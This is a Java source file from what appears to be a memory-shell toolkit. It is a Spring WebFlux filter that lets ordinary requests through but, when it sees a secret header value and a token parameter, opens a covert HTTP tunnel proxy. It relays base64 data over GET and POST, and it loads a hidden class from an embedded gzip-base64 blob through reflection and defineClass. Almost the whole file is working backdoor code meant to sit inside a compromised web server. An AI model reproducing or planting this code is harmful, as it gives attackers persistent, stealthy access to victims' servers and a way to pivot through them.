package com.reajason.javaweb.memshell.shelltool.proxy;

import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;
import reactor.core.scheduler.Schedulers;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.nio.charset.StandardCharsets;
import java.util.zip.GZIPInputStream;

public class ProxyWebFilter extends ClassLoader implements WebFilter {
    private static final int MAX_PUSH_SIZE = 4 * 1024 * 1024;
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;
    private static String headerName;
    private static String headerValue;

    public ProxyWebFilter() {
    }

    protected ProxyWebFilter(ClassLoader parent) {
        super(parent);
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        String token = request.getQueryParams().getFirst("token");
        boolean get = HttpMethod.GET.equals(request.getMethod());
        boolean post = HttpMethod.POST.equals(request.getMethod());
        String header = headerName == null ? null : request.getHeaders().getFirst(headerName);
        if (token == null || !get && (!post || token.length() == 0)
                || header == null || headerValue == null || headerValue.length() == 0
                || !header.contains(headerValue)) {
            return chain.filter(exchange);
        }
        try {
            if (get) {
                return token.length() == 0 ? authorize(exchange) : pull(exchange, token);
            }
            return push(exchange, token);
        } catch (Throwable e) {
            return complete(exchange.getResponse(), 500);
        }
    }

    private Mono<Void> authorize(ServerWebExchange exchange) throws Exception {
        String token = createSession();
        if (token == null) {
            return complete(exchange.getResponse(), 429);
        }
        byte[] body = ("token=" + token).getBytes(StandardCharsets.US_ASCII);
        ServerHttpResponse response = exchange.getResponse();
        response.getHeaders().setContentType(MediaType.TEXT_PLAIN);
        response.getHeaders().setContentLength(body.length);
        return response.writeWith(Mono.just(response.bufferFactory().wrap(body)));
    }

    private Mono<Void> pull(ServerWebExchange exchange, String token) throws Exception {
        if (!isValidToken(token)) {
            return complete(exchange.getResponse(), 400);
        }
        Object session = getOrCreateSession(token);
        if (session == null) {
            return complete(exchange.getResponse(), 429);
        }
        if (!beginPull(session)) {
            return complete(exchange.getResponse(), 409);
        }
        try {
            ServerHttpResponse response = exchange.getResponse();
                response.getHeaders().setContentType(MediaType.TEXT_PLAIN);
            response.getHeaders().set("X-Accel-Buffering", "no");
            Flux<DataBuffer> body = pullStream(session)
                    .map(value -> response.bufferFactory().wrap(value.getBytes(StandardCharsets.US_ASCII)));
            return response.writeWith(body).onErrorResume(e -> response.setComplete());
        } catch (Throwable e) {
            releasePull(session);
            throw e;
        }
    }

    private Mono<Void> push(ServerWebExchange exchange, String token) throws Exception {
        if (!isValidToken(token)) {
            return complete(exchange.getResponse(), 400);
        }
        Object session = getOrCreateSession(token);
        if (session == null) {
            return complete(exchange.getResponse(), 429);
        }
        return readBody(exchange.getRequest())
                .flatMap(body -> Mono.fromCallable(() -> writeBody(session, body))
                        .subscribeOn(Schedulers.boundedElastic()))
                .flatMap(status -> complete(exchange.getResponse(), status))
                .onErrorResume(e -> {
                    closeQuietly(session);
                    return complete(exchange.getResponse(), 500);
                });
    }

    private static Mono<byte[]> readBody(ServerHttpRequest request) {
        return DataBufferUtils.join(request.getBody(), MAX_PUSH_SIZE)
                .doOnDiscard(DataBuffer.class, DataBufferUtils::release)
                .map(buffer -> {
                    try {
                        byte[] body = new byte[buffer.readableByteCount()];
                        buffer.read(body);
                        return body;
                    } finally {
                        DataBufferUtils.release(buffer);
                    }
                })
                .switchIfEmpty(Mono.just(new byte[0]));
    }

    private static int writeBody(Object session, byte[] body) throws Exception {
        // A zero-length write detects a closed session without changing the upstream data.
        try {
            call(session, "write", new Class[]{byte[].class}, new Object[]{new byte[0]});
        } catch (InvocationTargetException e) {
            if (e.getCause() instanceof IOException) {
                return 410;
            }
            closeQuietly(session);
            return 500;
        }
        if (body.length == 0) {
            call(session, "close", new Class[0], new Object[0]);
            return 200;
        }
        byte[] decoded;
        try {
            decoded = decodeBase64(new String(body, StandardCharsets.ISO_8859_1).trim());
        } catch (Throwable e) {
            closeQuietly(session);
            return 400;
        }
        try {
            call(session, "write", new Class[]{byte[].class}, new Object[]{decoded});
            return 200;
        } catch (InvocationTargetException e) {
            if (e.getCause() instanceof IOException) {
                return 410;
            }
            closeQuietly(session);
            return 500;
        } catch (Throwable e) {
            closeQuietly(session);
            return 500;
        }
    }

    private static Flux<String> pullStream(Object session) {
        return Flux.<String>generate(sink -> {
                    try {
                        byte[] data = (byte[]) call(session, "poll", new Class[0], new Object[0]);
                        if (data == null) {
                            sink.next("\n");
                        } else if (data.length == 0) {
                            sink.complete();
                        } else {
                            sink.next(encodeBase64(data) + "\n");
                        }
                    } catch (Throwable e) {
                        sink.error(e);
                    }
                })
                .subscribeOn(Schedulers.boundedElastic())
                .doFinally(signal -> releasePull(session));
    }

    private static Mono<Void> complete(ServerHttpResponse response, int status) {
        response.setRawStatusCode(status);
        return response.setComplete();
    }

    private static String createSession() throws Exception {
        return (String) call(getProxyHttpClass(), "createSession", new Class[0], new Object[0]);
    }

    private static Object getOrCreateSession(String token) throws Exception {
        return call(getProxyHttpClass(), "getOrCreateSession", new Class[]{String.class}, new Object[]{token});
    }

    private static boolean isValidToken(String token) throws Exception {
        return Boolean.TRUE.equals(call(getProxyHttpClass(), "isValidToken",
                new Class[]{String.class}, new Object[]{token}));
    }

    private static boolean beginPull(Object session) throws Exception {
        return Boolean.TRUE.equals(call(session, "beginPull", new Class[0], new Object[0]));
    }

    private static void releasePull(Object session) {
        closeQuietly(session);
        try {
            call(session, "endPull", new Class[0], new Object[0]);
        } catch (Throwable ignored) {
        }
    }

    private static void closeQuietly(Object session) {
        try {
            call(session, "close", new Class[0], new Object[0]);
        } catch (Throwable ignored) {
        }
    }

    private static Object call(Object target, String name, Class<?>[] types, Object[] args) throws Exception {
        boolean staticCall = target instanceof Class;
        Class<?> type = staticCall ? (Class<?>) target : target.getClass();
        return type.getMethod(name, types).invoke(staticCall ? null : target, args);
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyWebFilter.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = new ProxyWebFilter(Thread.currentThread().getContextClassLoader())
                            .defineClass(bytes, 0, bytes.length);
                }
            }
        }
        return proxyHttpClass;
    }

    @SuppressWarnings("all")
    private static String encodeBase64(byte[] value) throws Exception {
        try {
            Class<?> codecClass = Class.forName("java.util.Base64");
            Object encoder = codecClass.getMethod("getEncoder").invoke(null);
            return ((String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, value)).replaceAll("[\r\n]", "");
        } catch (Throwable e) {
            Class<?> codecClass = Class.forName("sun.misc.BASE64Encoder");
            return ((String) codecClass.getMethod("encode", byte[].class)
                    .invoke(codecClass.newInstance(), value)).replaceAll("[\r\n]", "");
        }
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (ClassNotFoundException e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }
}
